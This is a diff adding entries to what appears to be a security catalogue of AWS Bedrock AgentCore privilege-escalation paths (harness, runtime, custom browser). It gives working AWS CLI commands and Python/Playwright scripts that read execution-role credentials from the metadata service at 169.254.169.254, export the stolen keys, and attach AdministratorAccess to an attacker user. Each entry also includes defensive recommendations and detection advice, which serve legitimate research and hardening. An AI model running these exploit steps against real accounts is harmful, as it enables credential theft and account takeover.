+          "description": "The execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation, and the attacker would target a different resource."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "agent_resource",
+          "label": "Target existing runtime or harness",
+          "description": "Identify an existing runtime or harness that has a privileged execution role attached and uses IAM Inbound Auth. Use the list and get control-plane calls to discover candidates and confirm their execution role.\n\nCommands:\n```bash\naws bedrock-agentcore-control list-agent-runtimes\naws bedrock-agentcore-control list-harnesses\naws bedrock-agentcore-control get-agent-runtime --agent-runtime-id RUNTIME_ID\n```\n"
+        },
+        {
+          "from": "agent_resource",
+          "to": "execution_role",
+          "label": "bedrock-agentcore:InvokeAgentRuntimeCommand",
+          "description": "The attacker submits a shell command that runs as root inside the microVM, parallel to the agent process and bypassing the agent, model and guardrails. The command has access to the execution role credentials through MMDS."
+        },
+        {
+          "from": "execution_role",
+          "to": "method_sdk_attack",
+          "label": "Option A",
+          "branch": "A",
+          "description": "The attacker submits a command that uses the role credentials in place from the root shell to perform privileged actions directly."
+        },
+        {
+          "from": "execution_role",
+          "to": "method_cred_exfil",
+          "label": "Option B",
+          "branch": "B",
+          "description": "The attacker submits a command that reads the role credentials from MMDS and returns them in the response stream for use from any location."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "A1",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the in-place command grants the starting principal full administrative access, for example by attaching admin policies or creating admin access keys."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "A2",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the in-place command can still grant useful additional access within the role permission scope or reach sensitive resources."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "A3",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the in-place command cannot perform meaningful privilege escalation and the attacker would target a different resource."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "B1",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the exfiltrated credentials give the attacker full administrative access to the AWS account from any location."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "B2",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the exfiltrated credentials can be used for lateral movement or additional attacks."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "B3",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the exfiltrated credentials provide limited value for privilege escalation."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-06-15T19:04:36Z",
+      "lastUpdated": "2026-08-24T13:22:24Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        }
+      ]
+    },
+    "filePath": "data/paths/bedrock/bedrock-004.yaml"
+  },
+  {
+    "id": "bedrock-005",
+    "name": "iam:PassRole + bedrock-agentcore:CreateHarness + bedrock-agentcore:CreateAgentRuntime + bedrock-agentcore:CreateAgentRuntimeEndpoint + bedrock-agentcore:CreateWorkloadIdentity + bedrock-agentcore:CreateMemory + bedrock-agentcore:GetMemory + bedrock-agentcore:GetAgentRuntime + bedrock-agentcore:GetHarness + bedrock-agentcore:InvokeAgentRuntimeCommand",
+    "category": "new-passrole",
+    "services": [
+      "iam",
+      "bedrock-agentcore"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section and the role must trust bedrock-agentcore.amazonaws.com"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateHarness",
+          "resourceConstraints": "Must have permission to create Bedrock AgentCore harnesses"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateAgentRuntime",
+          "resourceConstraints": "CreateHarness provisions a Runtime under the hood, which requires this permission"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateAgentRuntimeEndpoint",
+          "resourceConstraints": "Required to create the runtime endpoint the harness uses"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateWorkloadIdentity",
+          "resourceConstraints": "Required to create the workload identity the underlying runtime needs"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateMemory",
+          "resourceConstraints": "AWS requires this permission on every CreateHarness call regardless of the memory configuration chosen, including when memory is explicitly disabled"
+        },
+        {
+          "permission": "bedrock-agentcore:GetMemory",
+          "resourceConstraints": "Required alongside CreateMemory as part of CreateHarness's managed-memory provisioning"
+        },
+        {
+          "permission": "bedrock-agentcore:GetAgentRuntime",
+          "resourceConstraints": "Required to resolve the runtime that CreateHarness provisions before invoking it"
+        },
+        {
+          "permission": "bedrock-agentcore:GetHarness",
+          "resourceConstraints": "Required to poll the harness status until it reaches READY before invoking commands"
+        },
+        {
+          "permission": "bedrock-agentcore:InvokeAgentRuntimeCommand",
+          "resourceConstraints": "Must have permission to invoke commands on the created harness"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering AgentCore execution roles available to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PassRole`, `bedrock-agentcore:CreateHarness` and the supporting create and invoke permissions can deploy a new AgentCore Harness with a privileged IAM execution role and then run shell commands as root inside its Firecracker microVM. Harness is AgentCore Runtime with a managed agent layer on top (model, tools, memory, observability), and `CreateHarness` provisions a Runtime under the hood, which is why the chain also needs the runtime create permissions and `GetAgentRuntime`. `InvokeAgentRuntimeCommand` runs as root parallel to the managed agent loop, bypassing the agent, model and guardrails, and reads the execution role temporary credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS. Creating the harness rather than targeting an existing one lets the attacker pick exactly which role to escalate to.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
+        "At least one Bedrock foundation model must be enabled in the account (required at CreateHarness time to specify which model backs the Harness; the model is never invoked by the attack)"
+      ],
+      "lateral": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it",
+        "At least one Bedrock foundation model must be enabled in the account (required at CreateHarness time to specify which model backs the Harness; the model is never invoked by the attack)"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "export AWS_REGION=[your region]\nexport EXECUTION_ROLE=arn:aws:iam::[account-id]:role/[role with admin privs that trusts bedrock-agentcore]\nexport MODEL_ID=[a Bedrock model id available in the account]\nwhich jq\n",
+          "description": "Set up session variables and confirm jq is installed"
+        },
+        {
+          "step": 2,
+          "command": "CREATE_OUTPUT=$(aws bedrock-agentcore-control create-harness \\\n  --harness-name atk_harness \\\n  --execution-role-arn $EXECUTION_ROLE \\\n  --model \"{\\\"bedrockModelConfig\\\":{\\\"modelId\\\":\\\"$MODEL_ID\\\"}}\" \\\n  --memory '{\"disabled\":{}}')\nHARNESS_ARN=$(echo \"$CREATE_OUTPUT\" | jq -r .harness.arn)\nHARNESS_ID=$(echo \"$CREATE_OUTPUT\" | jq -r .harness.harnessId)\n",
+          "description": "Create a harness with the privileged execution role. CreateHarness provisions a runtime, endpoint, workload identity and memory resource under the hood, hence the longer permission chain. Memory is disabled since this attack never uses the managed agent loop, but AWS still requires the memory-related permissions on every CreateHarness call"
+        },
+        {
+          "step": 3,
+          "command": "while true; do\n  STATUS=$(aws bedrock-agentcore-control get-harness \\\n    --harness-id $HARNESS_ID --query 'harness.status' --output text)\n  [ \"$STATUS\" = \"READY\" ] && break\n  sleep 15\ndone\n",
+          "description": "Poll the harness until it reaches READY state. The underlying runtime takes a few minutes to provision, and InvokeAgentRuntimeCommand fails until it is ready"
+        },
+        {
+          "step": 4,
+          "command": "cat << 'EOF' > \"get_creds_from_harness.py\"\nimport boto3, sys, uuid\nclient = boto3.client(\"bedrock-agentcore\", region_name=sys.argv[2])\n\ndef run(cmd):\n  response = client.invoke_agent_runtime_command(\n    agentRuntimeArn=sys.argv[1],\n    runtimeSessionId=str(uuid.uuid4()),\n    body={\"command\": cmd, \"timeout\": 30},\n  )\n  out = \"\"\n  for event in response[\"stream\"]:\n    chunk = event[\"chunk\"]\n    if \"contentDelta\" in chunk and \"stdout\" in chunk[\"contentDelta\"]:\n      out += chunk[\"contentDelta\"][\"stdout\"]\n  return out\n\n# The execution role's MMDS alias is not necessarily known in advance, so\n# discover it before fetching credentials, mirroring EC2 IMDS role discovery.\ntoken_and_role = run(\"\"\"bash -c '\nTOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\necho $TOKEN\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n'\"\"\")\ntoken, role_name = token_and_role.strip().split(\"\\n\")\n\ncreds = run(f\"\"\"bash -c '\ncurl -s -H \"X-aws-ec2-metadata-token: {token}\" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\n'\"\"\")\nprint(creds, end=\"\")\nEOF\n",
+          "description": "Create the python file that first discovers the execution role's name from MMDS, then submits a root shell command reading its temporary credentials"
+        },
+        {
+          "step": 5,
+          "command": "CREDS=$(python3 get_creds_from_harness.py $HARNESS_ARN $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
+          "description": "Run the python file using the $HARNESS_ARN to extract the execution role credentials"
+        },
+        {
+          "step": 6,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to act as the harness execution role"
+        }
+      ]
+    },
+    "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful. The `bedrock-agentcore:InvokeAgentRuntimeCommand` permission then runs arbitrary commands as root inside the harness microVM, bypassing the managed agent loop, model and guardrails.\n\n- **Avoid administrative service roles** - Very rarely does an AgentCore Harness need administrative access. Use the principle of least privilege and start from AWS's documented harness execution role policy.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n- **Constrain `bedrock-agentcore:InvokeAgentRuntimeCommand`** - Treat it as a command-execution gate equivalent to root on the microVM and deny it org-wide except for an approved allowlist.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAgentCoreHarnessRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"bedrock-agentcore.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Enable CloudTrail data events for the `AWS::BedrockAgentCore::Runtime` and `RuntimeEndpoint` resource types; Harness manages a Runtime under the hood, so these types capture the harness command invocations\n- The auto-created `/aws/bedrock-agentcore/runtimes/<runtimeId>-DEFAULT` CloudWatch log group records the body of every submitted command; alert on entries that touch 169.254.169.254 or security-credentials\n- Monitor CloudTrail for harness creation followed by immediate invocation, and for harnesses created by principals who do not usually deploy AgentCore\n- Monitor CloudTrail for roles being passed to bedrock-agentcore that have not been passed before\n- Regularly audit all IAM roles that trust bedrock-agentcore.amazonaws.com, including the Console-provisioned harness default service role, and down-scope any with administrative access\n",
+    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Sergio Garcia",
+        "organization": "BeyondTrust Phantom Labs",
+        "date": 2026,
+        "link": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      "derivativeOf": {
+        "pathId": "bedrock-003",
+        "modification": "Targets a Harness instead of a bare Runtime; CreateHarness provisions a Runtime under the hood so the chain adds CreateHarness and GetAgentRuntime, but the credential theft via InvokeAgentRuntimeCommand and MMDS is identical"
+      }
+    },
+    "references": [
+      {
+        "title": "Mapping Every Privilege Escalation Path in AWS AgentCore",
+        "url": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      },
+      {
+        "title": "Amazon Bedrock AgentCore Harness",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/harness.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-003",
+      "bedrock-004",
+      "ec2-001",
+      "sagemaker-001"
+    ],
+    "detectionTools": {
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L324"
+    },
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "privesc-one-hop/to-admin/iam-passrole+bedrockagentcore-createharness",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal with iam:PassRole and the bedrock-agentcore create and invoke permissions. Can be an IAM user or role. This is the attacker's initial access point."
+        },
+        {
+          "id": "harness",
+          "label": "New AgentCore Harness",
+          "type": "resource",
+          "description": "A new AgentCore Harness created with a privileged execution role. CreateHarness provisions a Runtime under the hood that runs on a Firecracker microVM and exposes the role credentials on the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS."
+        },
+        {
+          "id": "target_role",
+          "label": "Existing Role That Trusts the bedrock-agentcore Service",
+          "type": "principal",
+          "description": "The IAM role passed to the harness as its execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. AgentCore assumes the role, waits for the harness to reach READY, and then serves its temporary credentials on MMDS at a security-credentials endpoint named after the role inside the microVM. The attacker discovers this name by requesting the security-credentials path with no role name before fetching credentials, mirroring EC2 IMDS role discovery."
+        },
+        {
+          "id": "method_sdk_attack",
+          "label": "Method 1: Act directly from the root shell",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The submitted command runs as root inside the microVM where the execution role credentials are already present, so the attacker can perform privileged actions in place without exfiltrating anything.\n\nExample command body invoked through InvokeAgentRuntimeCommand:\n```bash\naws iam attach-user-policy \\\n  --user-name attacker-user \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
+        },
+        {
+          "id": "method_cred_exfil",
+          "label": "Method 2: Exfiltrate credentials to the response stream",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location.\n\nExample command body invoked through InvokeAgentRuntimeCommand:\n```bash\nTOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\n```\n\nThis returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The execution role has AdministratorAccess or equivalent permissions, so acting as the role or using its exfiltrated credentials gives the attacker full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Some additional access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "The execution role has some elevated permissions but not full admin. This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role permissions to determine what was gained."
+        },
+        {
+          "id": "no_access",
+          "label": "No additional access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "The execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation, and the attacker would pass a different role."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "harness",
+          "label": "iam:PassRole + bedrock-agentcore:CreateHarness",
+          "description": "Create a new AgentCore Harness and pass the target role to it as the execution role. The harness provisions a runtime on a Firecracker microVM with access to MMDS.\n\nCommand:\n```bash\naws bedrock-agentcore-control create-harness \\\n  --harness-name atk_harness \\\n  --execution-role-arn $EXECUTION_ROLE \\\n  --model '{\"bedrockModelConfig\":{\"modelId\":\"<model-id>\"}}'\n```\n"
+        },
+        {
+          "from": "harness",
+          "to": "target_role",
+          "label": "Harness runtime assumes the execution role",
+          "description": "The attacker polls GetHarness until the harness reaches READY. AgentCore then assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt; inside the harness microVM, where the role name is discovered rather than assumed."
+        },
+        {
+          "from": "target_role",
+          "to": "method_sdk_attack",
+          "label": "Option A",
+          "branch": "A",
+          "description": "The attacker submits a command that uses the role credentials in place from the root shell to perform privileged actions directly."
+        },
+        {
+          "from": "target_role",
+          "to": "method_cred_exfil",
+          "label": "Option B",
+          "branch": "B",
+          "description": "The attacker submits a command that reads the role credentials from MMDS and returns them in the response stream for use from any location."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "A1",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the in-place command grants the starting principal full administrative access, for example by attaching admin policies or creating admin access keys."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "A2",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the in-place command can still grant useful additional access within the role permission scope or reach sensitive resources."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "A3",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the in-place command cannot perform meaningful privilege escalation and the attacker would pass a different role."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "B1",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the exfiltrated credentials give the attacker full administrative access to the AWS account from any location."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "B2",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the exfiltrated credentials can be used for lateral movement or additional attacks."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "B3",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the exfiltrated credentials provide limited value for privilege escalation."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-06-15T19:04:36Z",
+      "lastUpdated": "2026-08-24T13:22:24Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        }
+      ]
+    },
+    "filePath": "data/paths/bedrock/bedrock-005.yaml"
+  },
+  {
+    "id": "bedrock-006",
+    "name": "iam:PassRole + bedrock-agentcore:CreateBrowser + bedrock-agentcore:StartBrowserSession + bedrock-agentcore:ConnectBrowserAutomationStream",
+    "category": "new-passrole",
+    "services": [
+      "iam",
+      "bedrock-agentcore"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section and the role must trust bedrock-agentcore.amazonaws.com"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateBrowser",
+          "resourceConstraints": "Must have permission to create Bedrock AgentCore Custom Browsers"
+        },
+        {
+          "permission": "bedrock-agentcore:StartBrowserSession",
+          "resourceConstraints": "Must have permission to start sessions on the created browser"
+        },
+        {
+          "permission": "bedrock-agentcore:ConnectBrowserAutomationStream",
+          "resourceConstraints": "Must have permission to connect a remote automation driver to the browser session"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering AgentCore execution roles available to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        },
+        {
+          "permission": "bedrock-agentcore:GetBrowser",
+          "resourceConstraints": "Useful for confirming the new browser reached a READY state before starting a session"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PassRole`, `bedrock-agentcore:CreateBrowser`, `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` can create a Custom Browser with a privileged IAM execution role and drive the browser over Chrome DevTools Protocol (CDP) to read the execution role credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254. The execution role is optional at browser creation, so the attacker attaches the target role on purpose. After waiting for the browser to reach a READY state, the attacker starts a browser session and reads the real automation WebSocket endpoint directly from the `start-browser-session` API response, signs the CDP connection with header-based SigV4 authentication, and connects with a CDP client such as Playwright. The attacker installs a request hook that rewrites the MMDS token request from GET to PUT and injects the token header, discovers the execution role's name from the MMDS security-credentials index, then navigates to the role-credentials endpoint and reads the response. Creating the browser rather than targeting an existing one lets the attacker pick exactly which role to escalate to.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
+      ],
+      "lateral": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "export AWS_REGION=[your region]\nexport EXECUTION_ROLE=arn:aws:iam::[account-id]:role/[role with admin privs that trusts bedrock-agentcore]\npip install playwright boto3 && playwright install chromium\nwhich jq\n",
+          "description": "Set up session variables and install the Playwright CDP client used as the automation driver"
+        },
+        {
+          "step": 2,
+          "command": "BROWSER_ID=$(aws bedrock-agentcore-control create-browser \\\n  --name atk_browser \\\n  --execution-role-arn $EXECUTION_ROLE \\\n  --network-configuration '{\"networkMode\":\"PUBLIC\"}' | jq -r .browserId)\n",
+          "description": "Create a Custom Browser with the privileged execution role"
+        },
+        {
+          "step": 3,
+          "command": "while true; do\n  BROWSER_STATUS=$(aws bedrock-agentcore-control get-browser \\\n    --browser-id $BROWSER_ID \\\n    --region $AWS_REGION \\\n    --query 'status' --output text)\n  echo \"Browser status: $BROWSER_STATUS\"\n  [ \"$BROWSER_STATUS\" = \"READY\" ] && break\n  sleep 15\ndone\n",
+          "description": "Poll bedrock-agentcore:GetBrowser until the browser's underlying MicroVM finishes provisioning and reaches a READY state; the execution role's credentials are not yet being served on MMDS before then"
+        },
+        {
+          "step": 4,
+          "command": "cat << 'EOF' > \"get_creds_from_browser.py\"\nimport boto3, sys\nfrom urllib.parse import urlparse\nfrom botocore.auth import SigV4Auth\nfrom botocore.awsrequest import AWSRequest\nfrom botocore.credentials import Credentials\nfrom playwright.sync_api import sync_playwright\n\nBROWSER_ID = sys.argv[1]\nREGION = sys.argv[2]\n\nclient = boto3.client(\"bedrock-agentcore\", region_name=REGION)\nsession = client.start_browser_session(browserIdentifier=BROWSER_ID, sessionTimeoutSeconds=300)\nws_url = session[\"streams\"][\"automationStream\"][\"streamEndpoint\"]\n\nfrozen_creds = boto3.Session().get_credentials().get_frozen_credentials()\nsigning_creds = Credentials(frozen_creds.access_key, frozen_creds.secret_key, frozen_creds.token)\nsigning_url = ws_url.replace(\"wss://\", \"https://\")\nrequest = AWSRequest(method=\"GET\", url=signing_url, headers={\"host\": urlparse(signing_url).hostname})\nSigV4Auth(signing_creds, \"bedrock-agentcore\", REGION).add_auth(request)\nsigned_headers = dict(request.headers)\n\nwith sync_playwright() as p:\n    browser = p.chromium.connect_over_cdp(ws_url, headers=signed_headers)\n    page = browser.contexts[0].pages[0]\n    token = {\"value\": \"\"}\n\n    def rewrite(route):\n        if \"/latest/api/token\" in route.request.url:\n            route.continue_(method=\"PUT\", headers={\"X-aws-ec2-metadata-token-ttl-seconds\": \"60\"})\n        else:\n            route.continue_(headers={\"X-aws-ec2-metadata-token\": token[\"value\"]})\n\n    page.context.route(\"http://169.254.169.254/**\", rewrite)\n\n    page.goto(\"http://169.254.169.254/latest/api/token\")\n    token[\"value\"] = page.locator(\"pre\").text_content().strip()\n\n    page.goto(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\n    role_name = page.locator(\"pre\").text_content().strip()\n\n    page.goto(f\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\")\n    print(page.locator(\"pre\").text_content())\nEOF\n",
+          "description": "Create the python file that starts the browser session and reads the real automation WebSocket endpoint from the streams.automationStream.streamEndpoint field of the API response (never hand-construct this URL), signs the CDP connection with header-based SigV4 auth passed to connect_over_cdp, discovers the execution role's name from the MMDS security-credentials index since it is not known in advance (mirroring EC2 IMDS role discovery), then reads its credentials via a context.route hook that rewrites GET to PUT and injects the MMDSv2 token header"
+        },
+        {
+          "step": 5,
+          "command": "python3 get_creds_from_browser.py $BROWSER_ID $AWS_REGION",
+          "description": "Run the driver against the new browser to print the execution role credentials"
+        },
+        {
+          "step": 6,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to act as the browser execution role"
+        }
+      ]
+    },
+    "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does a Custom Browser need administrative access. Use the principle of least privilege and start from AWS's documented browser execution role policy.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n- **Create Custom Browsers without an execution role when the workload does not need AWS API access from inside the sandbox** - A role-less browser has no credentials to leak on MMDS.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAgentCoreBrowserRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"bedrock-agentcore.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Enable CloudTrail data events for the `AWS::BedrockAgentCore::BrowserCustom` resource type to capture `StartBrowserSession` and the automation stream connection\n- Custom Browser only exposes session-metadata usage logs; what happens inside the automation stream (the MMDS read) is not visible to AWS, so prevention and role scoping matter more than detection here\n- Monitor CloudTrail for browser creation followed by an immediate session start, and for browsers created by principals who do not usually deploy AgentCore\n- Monitor CloudTrail for roles being passed to bedrock-agentcore that have not been passed before\n- Regularly audit all IAM roles that trust bedrock-agentcore.amazonaws.com and down-scope any with administrative access\n",
+    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Sergio Garcia",
+        "organization": "BeyondTrust Phantom Labs",
+        "date": 2026,
+        "link": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      }
+    },
+    "references": [
+      {
+        "title": "Mapping Every Privilege Escalation Path in AWS AgentCore",
+        "url": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      },
+      {
+        "title": "Amazon Bedrock AgentCore Browser tool",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/browser-tool.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-003",
+      "bedrock-007",
+      "ec2-001",
+      "sagemaker-001"
+    ],
+    "detectionTools": {
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L339"
+    },
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "privesc-one-hop/to-admin/iam-passrole+bedrockagentcore-createbrowser",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "attackVisualization": {
